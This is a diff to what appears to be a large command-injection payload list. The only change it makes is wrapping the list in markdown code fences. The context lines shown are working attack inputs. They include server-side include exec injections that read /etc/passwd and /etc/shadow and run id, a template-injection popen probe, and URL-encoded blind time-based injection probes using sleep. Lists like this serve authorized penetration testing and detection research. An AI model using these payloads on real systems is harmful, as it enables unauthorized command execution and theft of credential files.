@@ -1,3 +1,4 @@
+````sh
 &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
 &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
 &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
@@ -6053,3 +6054,4 @@ ${popen(print(`echo%20QDXUDJ\necho%20$((17%2B75))\necho%20QDXUDJ\necho%20QDXUDJ`
 %22%0A%20str%3D%24%28echo%20NFJEZO%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%204%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2522
 %22%0A%20str%3D%24%28echo%20NFJEZO%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%205%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2522
 %22%0A%20str%3D%24%28echo%20NFJEZO%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2522
+````sh
